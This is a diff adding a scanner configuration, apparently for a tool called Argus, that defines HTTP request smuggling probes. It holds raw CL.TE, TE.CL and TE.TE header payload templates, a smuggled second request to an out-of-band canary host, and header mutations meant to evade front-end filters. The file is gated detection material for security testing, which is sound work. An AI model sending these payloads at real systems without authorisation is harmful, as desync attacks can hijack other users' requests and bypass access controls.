@@ -1,0 +1,42 @@
+family_id: http_smuggling
+description: >-
+  HTTP request smuggling (CL.TE, TE.CL, TE.TE) probes. HIGH-risk family —
+  operator approval is mandatory before the builder emits a bundle. Seeds
+  embed only marker headers; the validator pairs them with a small canary
+  body and observes back-end disagreement via OAST and differential timing.
+cwe_ids: [444]
+owasp_top10:
+  - 'A05:2021'
+risk_level: high
+requires_approval: true
+oast_required: true
+payloads:
+  - id: cl_te_marker
+    template: "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX-Argus-Canary: {canary}"
+    confidence: suspected
+    notes: Classic CL.TE marker; differential parsing leaks the canary header.
+  - id: te_cl_marker
+    template: "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nX-Argus-Canary: {canary}\r\n0\r\n\r\n"
+    confidence: suspected
+    notes: TE.CL marker; back-end uses CL, front-end uses TE.
+  - id: te_te_obfuscate
+    template: "Transfer-Encoding: chunked\r\nTransfer-Encoding: x\r\nX-Argus-Canary: {canary}"
+    confidence: suspected
+    notes: Duplicate TE header; tests TE.TE parser disagreement.
+  - id: te_obfuscate_space
+    template: "Transfer-Encoding : chunked\r\nX-Argus-Canary: {canary}"
+    confidence: suspected
+    notes: Space before colon; bypasses front-end TE detection.
+  - id: oast_smuggle_canary
+    template: "GET /{canary} HTTP/1.1\r\nHost: {oast_host}\r\n"
+    confidence: confirmed
+    notes: Smuggled second-request canary; OAST hit confirms desync.
+mutations:
+  - name: case_flip
+    description: Header-name case flips defeat substring filters on TE/CL.
+  - name: whitespace_alt
+    description: Whitespace-around-colon variants probe parser robustness.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw header bytes (sent by the validator's HTTP shim).
